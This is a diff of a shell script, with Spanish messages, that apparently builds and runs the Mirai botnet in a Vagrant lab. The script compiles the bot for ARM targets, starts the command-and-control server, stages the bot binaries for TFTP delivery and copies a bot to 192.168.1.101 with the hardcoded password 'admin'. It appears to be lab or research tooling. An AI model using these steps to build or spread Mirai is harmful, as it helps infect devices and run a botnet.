@@ -2,6 +2,7 @@
 
 
 echo ">>> Recompilando... Cerrando proceso CNC... "
+sudo apt-get install -y electric-fence 
 killall cnc || true
 export PATH=$PATH:/etc/xcompile/cross-compiler-armv4l/bin
 export PATH=$PATH:/etc/xcompile/cross-compiler-armv6l/bin
@@ -26,9 +27,9 @@ echo ">>> Building mirai bot and cnc..."
 cd /vagrant/mirai/
 ./build.sh debug telnet
 
-killall inetd || true
-killall cnc || true
-duende /vagrant/mirai/debug/cnc
+sudo killall inetd || true
+sudo killall cnc || true
+sudo duende /vagrant/mirai/debug/cnc
 cp /vagrant/mirai/debug/mirai* /vagrant/tftp/
 
 echo ">>> Building dlr..."
@@ -42,9 +43,4 @@ cd /vagrant/mirai/loader
 
 echo ">>> Terminado, EJECUTA start.bat para volver a iniciar"
 
-
-sudo apt install sshpass -y
 sshpass -p "admin" scp /vagrant/mirai/debug/mirai.dbg admin@192.168.1.101:/home/admin/
-
-
-echo ">>>Ejecutable enviado al bot_1. Terminado "
